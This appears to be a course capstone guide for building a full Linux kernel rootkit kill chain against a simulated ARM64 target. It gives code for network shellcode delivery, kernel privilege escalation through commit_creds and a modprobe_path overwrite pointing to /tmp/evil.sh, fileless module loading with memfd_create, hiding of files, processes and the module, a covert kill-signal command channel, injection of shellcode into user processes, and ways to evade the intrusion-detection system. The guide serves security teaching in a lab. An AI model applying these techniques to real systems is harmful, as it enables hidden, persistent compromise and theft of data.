# Flow of the Project: Kernel Rootkit Capstone — Complete Technical Guide

> **Operation COLDSPARK** — From zero access to full-spectrum kernel persistence on an AArch64 Linux target.

---

## Table of Contents

1. [The Big Picture](#1-the-big-picture)
2. [Stage 0 — Environment Setup & Recon](#2-stage-0--environment-setup--recon)
3. [Stage 1 — Initial Access: Beachhead Shellcode](#3-stage-1--initial-access-beachhead-shellcode)
4. [Stage 2 — Privilege Escalation: From Analyst to Root](#4-stage-2--privilege-escalation-from-analyst-to-root)
5. [Stage 3 — Persistence: Reflective Module Loading](#5-stage-3--persistence-reflective-module-loading)
6. [Stage 4 — Capability Installation: The Rootkit](#6-stage-4--capability-installation-the-rootkit)
7. [Stage 5 — C2 & Exfiltration](#7-stage-5--c2--exfiltration)
8. [Stage 6 — SNITCH Evasion (Bonus)](#8-stage-6--snitch-evasion-bonus)
9. [Stage 7 — End-to-End Integration](#9-stage-7--end-to-end-integration)
10. [Appendix: AArch64 Primer](#10-appendix-aarch64-primer)

---

## 1. The Big Picture

This capstone is a **kill chain** — a sequence of dependent stages where each one unlocks the next. You are attacking a simulated defense contractor (MERIDIAN DEFENSE GROUP) running an ARM64 Linux VM. The machine has classified intelligence files you need to exfiltrate.

```
  ┌─────────────────────┐     ┌──────────────────┐     ┌──────────────┐     ┌──────────────┐     ┌───────────────┐
  │   Stage 1           │     │     Stage 2      │     │   Stage 3    │     │   Stage 4    │     │   Stage 5     │
  │  INITIAL ACCESS     │────►│    PRIVILEGE     │────►│  REFLECTIVE  │────►│   ROOTKIT    │────►│  C2 + EXFIL   │
  │  (beachhead.S)      │     │   ESCALATION     │     │   LOADING    │     │ (rootkit.ko) │     │  (mykill/rkcmd)│
  └─────────────────────┘     │  (exploit/*.c)   │     │  (loader/)   │     └──────────────┘     └───────────────┘
   nc target:1337              └──────────────────┘     └──────────────┘
   submit shellcode            /dev/vuln_rwx or         memfd_create +       file hide, proc       read classified/
   → code exec as analyst      /dev/vuln_rw              finit_module         hide, access block    exfil 3 PIR flags
                               → uid=0 (root)           → rootkit.ko loaded   C2, inject
```

**Every stage depends on the previous one working.** You cannot escalate privileges without initial access. You cannot load the rootkit without root. You cannot exfiltrate without the rootkit hiding your tracks.

### The Target Environment

| Property | Value |
|---|---|
| Architecture | AArch64 (ARM 64-bit) |
| Kernel | Linux 6.6.0 |
| KASLR | **Disabled** (`nokaslr` boot parameter) |
| `/proc/kallsyms` | Root-only — use `System.map` from your kernel build |
| Users | `root` (uid 0), `analyst` (uid 1001), `director` (uid 1002) |
| Attack surface | MERIDIAN on port 1337, `/dev/vuln_rwx`, `/dev/vuln_rw` |
| Defense | SNITCH IDS (`snitch.ko`) — 8 detectors |

---

## 2. Stage 0 — Environment Setup & Recon

### 2.1 Cross-Compilation Toolchain

Everything you build runs on **AArch64** but you develop on **x86_64**. This means you need a cross-compiler. The toolchain prefix is `aarch64-linux-gnu-`:

```bash
sudo apt install qemu-system-arm gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu
```

The file `config.mk` at the repo root sets `ARCH=arm64` and `CROSS_COMPILE=aarch64-linux-gnu-` for all Makefiles. Every binary you produce — shellcode, exploits, kernel module, loader — is ARM64.

### 2.2 Kernel Headers

Your rootkit compiles as a **Loadable Kernel Module (LKM)** against Linux 6.6.0 headers. You don't build the full kernel — just prepare headers:

```bash
cd kernel
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.6.tar.xz
tar xf linux-6.6.tar.xz
cp dot-config linux-6.6/.config
cd linux-6.6
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- modules_prepare
```

**Why this matters:** The kernel headers define the exact data structures (`struct task_struct`, `struct cred`, `struct linux_dirent64`) your rootkit manipulates. A mismatch in struct layouts = kernel panic.

### 2.3 Symbol Resolution — Why `nokaslr` Is Your Friend

**KASLR (Kernel Address Space Layout Randomization)** randomizes where the kernel is loaded in memory on each boot. This target disables it.

Without KASLR, kernel symbol addresses are **identical on every boot**. You can look up critical functions in `System.map` (generated during kernel build) and hardcode their addresses:

```bash
grep prepare_kernel_cred kernel/linux-6.6/System.map
grep commit_creds kernel/linux-6.6/System.map
grep init_task kernel/linux-6.6/System.map
```

**Theoretical concept: Kernel Symbol Resolution**

In a real attack scenario, you'd need to defeat KASLR by:
- Leaking a kernel pointer (e.g., from `/proc`, dmesg, or a driver info leak)
- Using the leaked address to calculate the KASLR base offset
- Adding that offset to all `System.map` addresses

Here, you skip all of that and hardcode addresses directly. This is why the COLDSPARK team jokes that the sysadmin "left KASLR off because it was crashing the JIT thing."

### 2.4 The Development Cycle

```
Host (x86_64)                    Target VM (AArch64)
─────────────                    ──────────────────
1. Edit code                     
2. make                          
3. make deploy →─────────────→  4. mount-shared
   (copies to deploy/)              mount 9P shared folder
                                 5. sudo bash setup_capstone.sh
                                 6. sudo insmod rootkit.ko
                                 7. Test / iterate
```

The 9P shared folder lets you transfer files between host and VM without networking. `deploy/` is the staging area.

---

## 3. Stage 1 — Initial Access: Beachhead Shellcode

### 3.1 The Vulnerability: MERIDIAN Secure Terminal

The MERIDIAN service (`service/meridian.c`) is a TCP server on port 1337 running as the `analyst` user (uid 1001). It simulates an intelligence report terminal with commands like `reports`, `read`, `search`, and `status`.

The critical vulnerability is the **`submit` command**:

```c
// From meridian.c — cmd_submit()
// Step 1: Allocate RWX memory
region = mmap(NULL, size,
              PROT_READ | PROT_WRITE | PROT_EXEC,
              MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

// Step 2: Read raw bytes from socket into RWX region
while (total < size) {
    n = read(fd, (char *)region + total, size - total);
    total += n;
}

// Step 3: clone() executes the data as code
clone(submit_thread, stack + STACK_SIZE, CLONE_VM | SIGCHLD, &sa);

// submit_thread simply does:
void (*entry)(void) = (void (*)(void))sa->region;
entry();   // ← YOUR SHELLCODE RUNS HERE
```

**What this means:** The server allocates a Read-Write-Execute memory region, reads arbitrary bytes from the network into it, and then **executes those bytes as code** in a clone'd thread. There is zero validation. You send raw AArch64 machine code and it runs as `analyst`.

### 3.2 Theoretical Concepts: W⊕X and RWX Pages

**W⊕X (Write XOR Execute)** is a memory protection principle: a page should be either writable OR executable, never both. This prevents an attacker from writing code and then executing it.

MERIDIAN breaks this principle by mapping pages as `PROT_READ | PROT_WRITE | PROT_EXEC`. In the real world, this is equivalent to JIT compilation engines that don't properly transition pages from RW to RX after writing code.

### 3.3 Position-Independent Code (PIC)

Your beachhead shellcode must be **position-independent** — it works regardless of where in memory it's loaded. This means:

- **No absolute addresses** — you can't hardcode addresses because `mmap` returns different addresses each time
- **PC-relative addressing** — use `adr` (address relative to current PC) instead of absolute loads
- **No relocations** — the code is a flat binary, not an ELF. No dynamic linker fixes up addresses for you

**AArch64 PIC techniques:**
```asm
// BAD — absolute address (position-dependent):
movz x0, #0x1234
movk x0, #0x5678, lsl #16

// GOOD — PC-relative (position-independent):
adr  x0, my_string    // x0 = PC + offset_to_my_string

// For data after your code:
my_string:
  .asciz "/bin/sh"
```

### 3.4 What Your Shellcode Must Do

At minimum, your beachhead needs to give you an interactive shell as `analyst`. Common approaches:

**Option A: `execve("/bin/sh")`** — Replace the submit thread with a shell. The socket fd is inherited via `CLONE_VM`, so you can `dup2()` the socket fd onto stdin/stdout/stderr before exec. This gives you a remote shell.

```
execve flow:
1. dup2(socket_fd, 0)   // stdin
2. dup2(socket_fd, 1)   // stdout  
3. dup2(socket_fd, 2)   // stderr
4. execve("/bin/sh", ["/bin/sh", NULL], NULL)
```

**But how do you know the socket fd?** The `clone()` in meridian uses `CLONE_VM`, so the child shares the parent's address space — including file descriptors. The client fd is passed via `struct submit_args`. Since it's typically fd 4 or 5 (after stdin/out/err + server socket), you can either brute-force it or check `/proc/self/fd`.

**Option B: Connect-back shell** — Your shellcode connects back to your machine and spawns a shell there. More reliable since you control the fd.

### 3.5 Sending the Shellcode

```bash
# Assemble your shellcode
cd shellcode
make                         # beachhead.S → beachhead.bin

# Send it to the target
python3 tools/send_shellcode.py shellcode/beachhead.bin localhost 11337
```

The Python script:
1. Connects to MERIDIAN
2. Waits for the `analyst>` prompt
3. Sends `submit <size>`
4. Sends the raw binary bytes
5. The server allocates RWX, reads the bytes, and `clone()`s a thread that executes them

### 3.6 Key Constraint: Don't Crash the Service

The rubric requires that your shellcode **must not crash the MERIDIAN service**. The `clone()` creates a new thread sharing the address space. If your shellcode corrupts shared state (stack, heap, globals), the parent process crashes and you lose your connection.

**Safe pattern:** Your shellcode should immediately call `execve` or set up a self-contained execution environment. Don't touch the parent's stack or heap.

---

## 4. Stage 2 — Privilege Escalation: From Analyst to Root

### 4.1 Why You Need Root

The classified files live in `/home/director/classified/` owned by `director` (uid 1002) with mode `0700`. As `analyst` (uid 1001), you can't read them. You also can't load kernel modules, which you'll need for the rootkit.

### 4.2 The Linux Credential Model

**Theoretical concept: `struct cred`**

Every process in Linux has a set of credentials stored in `struct cred`:

```c
struct cred {
    atomic_long_t   usage;
    kuid_t          uid;    // real user ID
    kgid_t          gid;    // real group ID
    kuid_t          suid;   // saved user ID
    kgid_t          sgid;   // saved group ID
    kuid_t          euid;   // effective user ID — this is what permission checks use
    kgid_t          egid;   // effective group ID
    kuid_t          fsuid;  // filesystem user ID
    kgid_t          fsgid;  // filesystem group ID
    // ... capabilities, groups, keyrings ...
    struct group_info *group_info;  // supplementary groups
};
```

To become root, you need `uid = gid = euid = egid = 0`. There are two standard kernel functions for this:

1. **`prepare_kernel_cred(NULL)`** — Creates a new `struct cred` with all fields set to root (uid=0, gid=0, all capabilities). The `NULL` argument means "create root credentials."
2. **`commit_creds(new_cred)`** — Replaces the current process's credentials with the new ones.

Calling `commit_creds(prepare_kernel_cred(NULL))` in kernel context instantly makes the calling process root.

### 4.3 Undergrad Path: `/dev/vuln_rwx` — Kernel Shellcode Execution

The `vuln_rwx` driver (`drivers/vuln_rwx/vuln_rwx.c`) simulates a JIT engine that allocates executable kernel memory and runs user-supplied code:

```c
// vuln_rwx_ioctl():
buf = real_module_alloc(req.len);           // Allocate kernel executable memory
copy_from_user(buf, req.code, req.len);     // Copy user bytes into it
real_set_memory_x((unsigned long)buf, 1);   // Mark executable
flush_icache_range(...);                    // Flush I-cache (AArch64)
((void (*)(void))buf)();                    // EXECUTE IT IN RING 0
real_module_memfree(buf);                   // Free
```

**Your exploit writes kernel shellcode** that calls `commit_creds(prepare_kernel_cred(NULL))`, sends it via ioctl, and the driver executes it in kernel context. Your process is now root.

**The kernel shellcode looks like:**
```asm
// AArch64 kernel shellcode for privesc
// x0 = prepare_kernel_cred(NULL)
// commit_creds(x0)

mov  x0, #0                         // NULL argument
movz x1, #<prepare_kernel_cred low16>, lsl #0
movk x1, #<prepare_kernel_cred hi16>, lsl #16
movk x1, #<prepare_kernel_cred hi32>, lsl #32
movk x1, #<prepare_kernel_cred hi48>, lsl #48
blr  x1                             // x0 = prepare_kernel_cred(NULL)

movz x1, #<commit_creds low16>, lsl #0
movk x1, #<commit_creds hi16>, lsl #16
movk x1, #<commit_creds hi32>, lsl #32
movk x1, #<commit_creds hi48>, lsl #48
blr  x1                             // commit_creds(x0)

ret                                  // return to driver, which returns to userspace
```

**The exploit program (userspace):**
```c
// exploit_rwx.c sketch:
int fd = open("/dev/vuln_rwx", O_RDWR);
struct vuln_rwx_request req = {
    .code = shellcode_buf,
    .len  = shellcode_len,
};
ioctl(fd, VULN_RWX_EXEC, &req);     // triggers kernel shellcode execution
// After this returns, getuid() == 0
```

### 4.4 Grad Path: `/dev/vuln_rw` — Arbitrary Kernel Read/Write

The `vuln_rw` driver (`drivers/vuln_rw/vuln_rw.c`) provides raw kernel memory read/write via ioctl. No shellcode execution — you directly read and write kernel data structures.

```c
// vuln_rw_ioctl():
case VULN_KREAD:
    copy_from_kernel_nofault(kbuf, (void *)req.kaddr, req.len);
    copy_to_user(req.ubuf, kbuf, req.len);
    break;

case VULN_KWRITE:
    copy_from_user((void *)req.kaddr, req.ubuf, req.len);
    break;
```

**The exploit technique — walking `init_task.tasks`:**

**Theoretical concept: Process List in the Kernel**

Linux maintains a circular doubly-linked list of all `task_struct` structures, anchored at `init_task` (PID 1). Each `task_struct` has a `tasks` member of type `struct list_head`:

```
init_task.tasks ←→ task_A.tasks ←→ task_B.tasks ←→ ... ←→ init_task.tasks
```

To escalate privileges via arbitrary R/W:
1. **Find `init_task`** — its address is in `System.map` (no KASLR)
2. **Walk the task list** — read `init_task.tasks.next`, follow the chain
3. **Find your own task** — compare PID field in each `task_struct` to `getpid()`
4. **Read the `cred` pointer** — `task_struct` has a `const struct cred *cred` field
5. **Zero the uid/gid fields** — write zeros to `cred->uid`, `cred->euid`, `cred->gid`, `cred->egid`, `cred->fsuid`, `cred->fsgid`

**Critical offsets** — You need the byte offsets of fields within `task_struct` and `cred`. These come from the kernel headers for your specific kernel version (6.6.0). Use `pahole` or `offsetof()` macros to determine them.

### 4.5 Bonus LPE: `modprobe_path` Overwrite

**Theoretical concept:** When the kernel encounters an unknown binary format, it calls `modprobe` to load the appropriate module. The path to modprobe is stored in the global variable `modprobe_path` (typically `/sbin/modprobe`).

If you overwrite `modprobe_path` with a path to your script (e.g., `/tmp/evil.sh`) and then trigger a module load (e.g., execute a file with an unknown magic number), the **kernel will execute your script as root**.

```c
// Using /dev/vuln_rw:
char payload[] = "/tmp/evil.sh";
kwrite(modprobe_path_addr, payload, sizeof(payload));

// /tmp/evil.sh:
// #!/bin/sh
// chmod 4755 /bin/sh   # or copy /etc/shadow, etc.

// Trigger: execute a file with unknown format
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/bait && chmod +x /tmp/bait && /tmp/bait");
```

---

## 5. Stage 3 — Persistence: Reflective Module Loading

### 5.1 Why Not Just `insmod`?

`insmod` is the standard way to load a kernel module. But:
- It leaves traces: the module appears in `lsmod`, `/proc/modules`, `dmesg`
- It calls the `__arm64_sys_finit_module` syscall, which SNITCH monitors
- It's obvious to any forensic review

A **reflective loader** loads your module without using the standard path. The concept comes from offensive security: "reflective DLL injection" in Windows, applied to kernel modules.

### 5.2 Approach 1: `memfd_create` + `finit_module`

This is the simplest approach. `memfd_create` creates an **anonymous file** that exists only in memory — it has no path on disk.

```c
// loader sketch:
// 1. Create anonymous in-memory file
int mfd = memfd_create("", MFD_CLOEXEC);

// 2. Read rootkit.ko from disk (or from embedded bytes)
int fd = open("rootkit.ko", O_RDONLY);
char buf[4096];
while ((n = read(fd, buf, sizeof(buf))) > 0)
    write(mfd, buf, n);
close(fd);

// 3. Load the kernel module from the memfd
finit_module(mfd, "", 0);

// 4. Close the memfd — the anonymous file vanishes
close(mfd);
// rootkit.ko is now loaded, but the .ko file was never visible on disk
```

**Theoretical concept: `memfd_create`**

`memfd_create` creates a file descriptor backed by memory (tmpfs). Key properties:
- No filesystem path — the file exists only as an fd (visible in `/proc/pid/fd/N` while open)
- Doesn't touch disk — entire lifecycle is in RAM
- The fd is valid for `finit_module()` — the kernel just needs a readable fd to parse the ELF module

This is the **same concept** from your old reflective-loader assignment (`old_assignments/reflective-loader/loader.c`), which used `memfd_create` + `dlopen("/proc/self/fd/N")` for a userland SO. The capstone uses it for a kernel module via `finit_module()` instead of `dlopen()`.

### 5.3 Approach 2: Manual ELF Relocation (Hard Mode)

Parse the `.ko` ELF file yourself:
1. Read ELF headers, find `.text`, `.data`, `.bss`, `.rela` sections
2. Allocate kernel memory (using a kernel exploit or helper)
3. Apply AArch64 ELF relocations (R_AARCH64_ABS64, R_AARCH64_CALL26, etc.)
4. Resolve kernel symbols from `System.map`
5. Call the module's `init_module()` function directly

This is significantly harder but has a huge advantage: **the module never appears in `lsmod` or `/proc/modules`** because it was never registered with the kernel's module infrastructure.

---

## 6. Stage 4 — Capability Installation: The Rootkit

### 6.1 Architecture: Multi-File Kernel Module

Your rootkit is a single `.ko` compiled from multiple source files:

```
lkm/src/
├── rootkit.h       ← Shared defines, command codes, subsystem interfaces
├── rootkit.c       ← Module init/exit, ftrace blocking, module hiding
├── file_hide.c     ← getdents64 kretprobe — hide "secret" directories
├── proc_hide.c     ← getdents64 kretprobe — hide processes from /proc
├── c2.c            ← kill() kprobe — covert command channel
└── inject.c        ← Shellcode injection into userland processes
```

All six files are compiled together into `rootkit.ko`. The `rootkit_init()` function calls each subsystem's init in order, with goto-based error unwinding.

### 6.2 File Hiding — How `getdents64` Filtering Works

**Theoretical concept: How `ls` Works**

When you run `ls /tmp`, the following happens:
1. `openat(AT_FDCWD, "/tmp", O_DIRECTORY)` → fd
2. `getdents64(fd, dirp_buf, buf_size)` → reads directory entries into a buffer
3. Userspace reads the buffer and prints filenames
4. Repeat until `getdents64` returns 0

The `getdents64` syscall fills a buffer with `struct linux_dirent64` entries, each containing `d_name` (filename), `d_reclen` (record length), and other metadata. Entries are packed contiguously:

```
┌───────────────────┬───────────────────┬───────────────────┬──────┐
│  entry: "."       │  entry: ".."      │  entry: "secret"  │ ...  │
│  d_reclen: 32     │  d_reclen: 32     │  d_reclen: 40     │      │
└───────────────────┴───────────────────┴───────────────────┴──────┘
```

**The rootkit's approach:** Install a **kretprobe** on `__arm64_sys_getdents64`. The entry handler captures the buffer pointer before the syscall runs. The return handler runs *after* the syscall fills the buffer:

1. Copy the buffer from userspace to kernel space (`copy_from_user`)
2. Walk the packed entries, looking for ones named `"secret"`
3. Remove matching entries by:
   - If not the first entry: inflate the previous entry's `d_reclen` to absorb the hidden one
   - If the first entry: shift all subsequent entries forward with `memmove`
4. Copy the modified buffer back to userspace (`copy_to_user`)
5. Update the return value (number of bytes) in `regs->regs[0]`

**Theoretical concept: AArch64 Double `pt_regs`**

On AArch64, syscall wrappers like `__arm64_sys_getdents64` receive a single argument: a pointer to `struct pt_regs`. The actual syscall arguments are inside *that* `pt_regs`:

```
regs->regs[0] → address of inner pt_regs (user registers)
inner_regs->regs[0] = fd
inner_regs->regs[1] = dirp (buffer pointer)
inner_regs->regs[2] = count
```

This is called **double `pt_regs` indirection**. Your entry handler must do `inner_regs = (struct pt_regs *)regs->regs[0]` to reach the real arguments.

### 6.3 Path Protection — Blocking File Access with Traversal Handling

**What it does:** Prevent any process (except operators) from opening files under `/tmp/secret/` or `/dev/shm/secret/`.

**The challenge: Path Traversal**

A simple `strncmp(path, "/tmp/secret", 11)` check is trivially bypassed with:
```
/foo/bar/../../../tmp/secret/flag.txt
```

The kernel's `openat` syscall receives the **raw user string** before path resolution. You need to resolve it first.

**Approach using ftrace on `do_sys_openat2`:**

```c
// The ftrace callback intercepts before openat2 runs:
static void bouncer_callback(..., struct ftrace_regs *fregs) {
    const char __user *filename = ftrace_regs_get_argument(fregs, 1);
    
    // Copy path from userspace
    strncpy_from_user(path_buf, filename, MAX_PATH_LEN);
    
    // Resolve traversal: use kern_path() to get the canonical path
    if (kern_path(path_buf, LOOKUP_FOLLOW, &resolved_path) == 0) {
        char *resolved = d_path(&resolved_path, buf, sizeof(buf));
        // Now check if resolved starts with "/tmp/secret" or "/dev/shm/secret"
        if (matches_protected_path(resolved) && !has_magic_gid()) {
            // Deny: zero the filename pointer → causes -EFAULT
            ftrace_regs_set_argument(fregs, 1, 0);
        }
        path_put(&resolved_path);
    }
}
```

**Theoretical concept: ftrace**

`ftrace` is the kernel's function tracing framework. It works by patching the `nop` instructions at the start of every traceable function with a call to a tracing callback. On AArch64 with `DYNAMIC_FTRACE_WITH_ARGS`, your callback receives `struct ftrace_regs` containing the function's arguments — you can read and **modify** them.

The key flags:
- `FTRACE_OPS_FL_IPMODIFY` — allows modifying the instruction pointer (redirect to wrapper)
- `FTRACE_OPS_FL_RECURSION` — the framework handles recursion protection

**Why ftrace instead of kprobe for blocking?** The `INTEGRATION.md` maps blocking to the ftrace homework. Ftrace on `do_sys_openat2` gives you direct access to the filename argument without the double `pt_regs` indirection (because `do_sys_openat2` is an internal function, not a `__arm64_sys_*` wrapper).

### 6.4 Process Hiding — Filtering `/proc`

Process hiding reuses the **same dirent-filtering pattern** as file hiding, but:
- Hooks `getdents64` on `/proc` instead of `/tmp` and `/dev/shm`
- Identifies the directory being listed using `d_path()` on the file descriptor's dentry
- For each numeric directory entry (`/proc/123`), looks up the PID and checks if it has `MAGIC_GID` (1337) in its supplementary groups
- If yes, removes the entry from the dirent buffer

**Why a separate kretprobe?** You need different logic for `/proc` vs `/tmp`/`/dev/shm`. The file-hide kretprobe filters by filename ("secret"), the proc-hide kretprobe filters by PID-to-GID lookup.

### 6.5 Operator Bypass — The GID 1337 Mechanism

**Theoretical concept: Supplementary Groups**

Linux processes have a primary GID and a list of **supplementary groups** stored in `cred->group_info`. The rootkit uses GID 1337 as its operator marker:

- If a process has GID 1337 in its `group_info`, it's an "operator" — all hiding and blocking is bypassed
- Non-operator processes are blocked and blind

**Critical implementation detail: `in_group_p()` vs manual walk**

The kernel helper `in_group_p(gid)` checks if the current process belongs to a group. However, **it returns `true` for root** (uid 0), which would let unprivileged-but-root processes (like system daemons) bypass your hiding. The capstone requires you to walk `cred->group_info` directly:

```c
bool guardian_has_magic_gid(void) {
    const struct cred *cred = current_cred();
    struct group_info *gi = cred->group_info;
    int i;
    
    for (i = 0; i < gi->ngroups; i++) {
        if (gid_eq(gi->gid[i], KGIDT_INIT(MAGIC_GID)))
            return true;
    }
    return false;
}
```

### 6.6 Module Self-Hiding

**Theoretical concept: The Kernel Module List**

The kernel maintains a linked list of all loaded modules in `THIS_MODULE->list`. `lsmod` and `/proc/modules` walk this list. To hide your module:

```c
// Hide:
saved_prev = THIS_MODULE->list.prev;
list_del_init(&THIS_MODULE->list);

// Show (needed for rmmod):
list_add(&THIS_MODULE->list, saved_prev);
```

`list_del_init` removes your module from the list. `list_add` puts it back. You must save the previous pointer so you can restore the link for clean unloading.

**Subtlety:** `rmmod` calls `find_module()` which walks the same list. If your module isn't in the list, `rmmod rootkit` will say "module not found." The trick: your C2 channel has a `CMD_TOGGLE_MODULE` (command 3) that calls `show_module()` before you run `rmmod`.

---

## 7. Stage 5 — C2 & Exfiltration

### 7.1 Covert C2 via `kill()` — The Signal 62 Protocol

**Theoretical concept: Covert Channels**

A covert channel is a communication mechanism that wasn't designed for communication. The `kill()` syscall is meant to send signals to processes, but the rootkit repurposes it as a command channel.

**How it works:**

The rootkit installs a **kprobe on `__arm64_sys_kill`**. When any process calls `kill()`, the kprobe fires first. If the signal number is 62 (MAGIC_SIGNAL), the rootkit:

1. Reads the command code from the registers
2. Dispatches the command (toggle hiding, inject shellcode, etc.)
3. **Swallows the signal** — the actual `kill()` never delivers signal 62 to any process. The caller sees success.

**The Register Protocol (from `mykill.c`):**

```
x0 = command code (repurposed from "pid" argument)
x1 = 62 (MAGIC_SIGNAL)
x2 = sub-argument 1 (e.g., target PID for injection)
x3 = sub-argument 2
x4-x7 = reserved
x8 = __NR_kill (129 on AArch64)
```

**Why inline assembly in `mykill.c`?**

glibc's `kill()` function only sets x0 (pid) and x1 (sig) before the syscall. The C calling convention allows the compiler to clobber x2-x7. But the rootkit reads those registers for extended arguments. `mykill.c` uses inline asm to pin all 8 argument registers:

```c
static long raw_kill(long x0, long x1, long x2, long x3,
                     long x4, long x5, long x6, long x7) {
    register long r0 __asm__("x0") = x0;
    register long r1 __asm__("x1") = x1;
    // ... all 8 registers pinned ...
    register long r8 __asm__("x8") = __NR_kill;
    
    __asm__ volatile ("svc #0"
        : "+r"(r0)
        : "r"(r1), "r"(r2), ... "r"(r8)
        : "memory", "cc", ...);
    
    return r0;
}
```

**Why `kill()` and not, say, a `/proc` file or ioctl?**

- `/proc` files create filesystem artifacts SNITCH can detect
- ioctl requires a character device — visible in `/dev`
- `kill()` is called thousands of times per second on any Linux system. Signal 62 is in the real-time range (SIGRTMIN-1) and rarely used. It hides in plain sight.

### 7.2 Command Table

| Command | x0 | x2 | Effect |
|---|---|---|---|
| Status | 0 | — | Print rootkit state to `dmesg` |
| Toggle file hide | 1 | — | Register/unregister the getdents64 kretprobe for file hiding |
| Toggle access block | 2 | — | Enable/disable the ftrace path-blocking hook |
| Toggle module visibility | 3 | — | `show_module()` — restore module to lsmod |
| Toggle process hide | 4 | — | Register/unregister the getdents64 kretprobe for /proc |
| Add GID | 5 | target PID | Add GID 1337 to target process's supplementary groups |
| Inject shellcode | 6 | target PID | Read shellcode from staging file, inject into target |
| Reverse shell | 7 | port | (Not required) spawn a reverse shell |

### 7.3 Deferred Execution — Why Workqueues Matter

**Critical implementation detail:** Many C2 commands cannot execute directly from the kprobe handler because:

- **Registering/unregistering kprobes/kretprobes requires sleeping** — kprobe handlers run in atomic context (interrupts disabled). You cannot call `register_kretprobe()` from inside a kprobe handler.
- **`vm_mmap()` requires `current->mm == target->mm`** — injection needs `kthread_use_mm()` which only works from a kthread. Workqueue workers are kthreads.

The solution: **defer to a workqueue**. The kprobe handler allocates a work struct, sets the parameters, and calls `schedule_work()`. The work function runs later in process context where sleeping is allowed.

```c
// In c2.c — the kprobe handler:
case CMD_TOGGLE_HIDE:
    schedule_toggle(CMD_TOGGLE_HIDE);  // deferred, can sleep
    break;

case CMD_INJECT:
    schedule_inject(target_pid);       // deferred, needs kthread_use_mm
    break;

case CMD_TOGGLE_BLOCK:
    // This one IS safe inline — just flips a boolean flag
    blocking_active = !blocking_active;
    break;
```

### 7.4 Shellcode Injection — Kernel→Userland Code Injection

This is the most complex subsystem. The goal: inject AArch64 PIC shellcode into a **sleeping userland process** from kernel context.

**The flow (from `kinject.c` Part 1 & 2):**

```
1. C2 receives CMD_INJECT with target PID
2. schedule_inject() defers to workqueue
3. Workqueue worker (kthread):
   a. mmgrab(target->mm)              // Pin the mm_struct
   b. kthread_use_mm(target->mm)      // current->mm = target->mm
   c. vm_mmap(NULL, 0, PAGE_SIZE,     // Allocate RWX page in target
              PROT_READ|PROT_WRITE|PROT_EXEC,
              MAP_ANONYMOUS|MAP_PRIVATE, 0)
   d. copy_to_user(inject_addr, shellcode, len)  // Write shellcode
   e. vm_mmap() stack page            // For clone trampoline
   f. kthread_unuse_mm(target->mm)
   g. mmdrop(target->mm)
4. Write clone trampoline into target's VM_EXEC page
   (access_process_vm with FOLL_WRITE|FOLL_FORCE triggers COW)
5. Hijack target registers:
   regs->regs[28] = regs->pc          // Save original PC in x28
   regs->regs[27] = inject_addr       // Payload VA in x27
   regs->pc = trampoline_addr         // Redirect to trampoline
   regs->syscallno = ~0UL             // Prevent syscall restart
6. set_tsk_thread_flag(TIF_SIGPENDING) // Force wakeup
7. wake_up_process(target)             // Target resumes → trampoline
```

**Theoretical concept: Why `kthread_use_mm()`?**

`kthread_use_mm()` temporarily adopts another process's memory map. Since kernel threads don't have a userspace mm (`current->mm == NULL`), calling `kthread_use_mm(target->mm)` makes `current->mm = target->mm`. Now any mm-related operations (like `vm_mmap`, `copy_to_user`) operate on the **target's** address space.

**Theoretical concept: The Clone Trampoline**

Direct PC hijack (Part 1 of kinject) **kills the target process** — the target never returns to its original code. The clone trampoline (Part 2) fixes this:

```asm
// Trampoline (written into target's existing executable page):
clone(CLONE_VM | CLONE_THREAD | CLONE_SIGHAND, stack_top, 0, 0, 0)
if (x0 == 0) goto child        // clone returns 0 in child
mov x0, #-4                     // parent: -EINTR (restart interrupted syscall)
br  x28                          // parent: resume at original PC
child:
br  x27                          // child: jump to injected shellcode
```

The parent process resumes execution at its original PC as if nothing happened. The child thread runs the shellcode. The target survives.

### 7.5 Staging Shellcode: The `/tmp/secret/rk_sc` Path

On demo day, the instructor hands you a shellcode binary file. The injection flow:

```bash
# 1. mykill writes shellcode to the staging path
./mykill inject <target_pid> instructor_shellcode.bin
# → copies instructor_shellcode.bin to /tmp/secret/rk_sc
# → fires CMD_INJECT via kill(6, 62, pid, ...)

# 2. Kernel workqueue:
#    → reads /tmp/secret/rk_sc via kernel_read()
#    → unlinks the file (disappears)
#    → injects into target
```

The staging path `/tmp/secret/rk_sc` is inside the hidden directory — invisible to non-operator processes thanks to the file-hiding subsystem.

### 7.6 Exfiltration — Reading the PIR Flags

Once everything is working, you read the classified files:

```bash
cat /home/director/classified/agents.txt         # PIR-ALPHA
cat /home/director/classified/operation_blackbird.txt  # PIR-BRAVO
cat /home/director/classified/crypto_keys.txt    # PIR-CHARLIE
```

Since your rootkit is hiding your tracks, this looks like nothing happened on the system.

---

## 8. Stage 6 — SNITCH Evasion (Bonus)

### 8.1 What SNITCH Detects

SNITCH (`service/snitch/snitch.ko`) is a host IDS with 8 detectors:

| # | Detector | What It Watches | Your Subsystem |
|---|---|---|---|
| 1 | Hidden modules | Periodic sysfs vs. module list scan | Module hiding |
| 2 | Unauthorized kprobe hooks | Periodic debugfs scan | kretprobes (file_hide, proc_hide, c2) |
| 3 | Signal 62 | Monitors `__arm64_sys_kill` | C2 channel |
| 4 | `memfd_create` | Monitors the syscall | Reflective loader |
| 5 | `commit_creds` escalation | Monitors credential changes | LPE exploit |
| 6 | `finit_module` | Monitors module loading | Reflective loader |
| 7 | `register_ftrace_function` | Monitors ftrace registration | Path access blocking |
| 8 | `kthread_use_mm` | Monitors process memory takeover | Shellcode injection |

### 8.2 Evasion Strategies (Theoretical)

**Detector 1 (Hidden modules):** SNITCH compares sysfs module entries against `/proc/modules`. If they don't match, alarm. To evade: remove from both lists, or don't hide at all until needed.

**Detector 2 (Unauthorized kprobes):** SNITCH scans `/sys/kernel/debug/kprobes/list`. To evade: use ftrace IP redirect instead of kprobes (ftrace doesn't appear in kprobes list), or use syscall table patching.

**Detector 3 (Signal 62):** SNITCH has its own hook on `kill`. To evade: use a different covert channel (ioctl on a hijacked device, `/proc` entries, or netfilter hooks).

